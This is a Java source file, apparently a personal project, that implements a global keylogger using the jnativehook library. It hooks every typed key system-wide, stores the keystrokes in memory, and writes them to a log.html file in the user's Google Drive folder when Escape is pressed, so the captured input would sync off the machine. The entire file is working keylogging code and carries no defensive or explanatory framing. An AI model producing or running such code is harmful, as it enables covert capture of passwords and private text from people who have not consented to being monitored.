import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;

/**
 * Created with IntelliJ IDEA.
 * User: christianbartram
 * Date: 11/16/13
 * Time: 11:57 AM
 * To change this template use File | Settings | File Templates.
 */
public class Main implements NativeKeyListener {

    public ArrayList<String> contentToWrite = new ArrayList<String>();
    final String newline = System.getProperty("line.separator");


    //final String googleDrivePath = File.separator +"Users" + File.separator + System.getProperty("user.name") + File.separator + "Google Drive";

    final  String googleDriveFilePath = File.separator +"Users" + File.separator + System.getProperty("user.name") + File.separator + "Google Drive"
            + File.separator + "log.html";




    public static void main(String[] args) {
        try {

            GlobalScreen.registerNativeHook();
            System.out.println("Registered Native key Listener");

        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }

        GlobalScreen.getInstance().addNativeKeyListener(new Main());
        System.out.println("Added Native Key Listener to the Main class.");


    }


    protected void writeFile(String filePath, ArrayList<String> content) throws IOException {
        BufferedWriter writer = null;
        try {
            File logFile = new File(filePath);
            logFile.createNewFile();
            logFile.setReadable(true);
            logFile.setWritable(true);

            writer = new BufferedWriter(new FileWriter(logFile));
            if(content.size() > 0) {
                for(String line : content){
                    writer.write(line);
                    writer.newLine();

                }
                if(content.size() == 0) {
                    writer.write("ArrayList has no Content...");
                }
                System.out.println("File written with content.");
            }

            writer.close();
        } catch (Exception e) {
            e.printStackTrace();

        }
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));

        if (e.getKeyCode() == NativeKeyEvent.VK_ESCAPE) {
            try {
                writeFile(googleDriveFilePath, contentToWrite);
            } catch(IOException ex) {
                ex.printStackTrace();
            }
            System.out.println("Shutting Down...");
            System.exit(0);

        }
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        displayInfo(e, contentToWrite);
    }


    public void nativeKeyReleased(NativeKeyEvent e) {

    }

    protected void displayInfo(NativeKeyEvent e, ArrayList<String> contentToWrite){
        int id = e.getID();
        String keyString;
        if (id == NativeKeyEvent.NATIVE_KEY_TYPED) {
            char c = e.getKeyChar();
            keyString = "" + c + "";
            if(e.getKeyChar() == NativeKeyEvent.VK_SPACE) {
                keyString = "_";
            }

            if(e.getKeyChar() == NativeKeyEvent.VK_TAB) {
                keyString = newline;
            }

        } else {
            int keyCode = e.getKeyCode();
            keyString = "key code = " + keyCode

                    + " ("
                    + java.awt.event.KeyEvent.getKeyText(keyCode)
                    + ")";
        }
        contentToWrite.add(keyString);
    }



}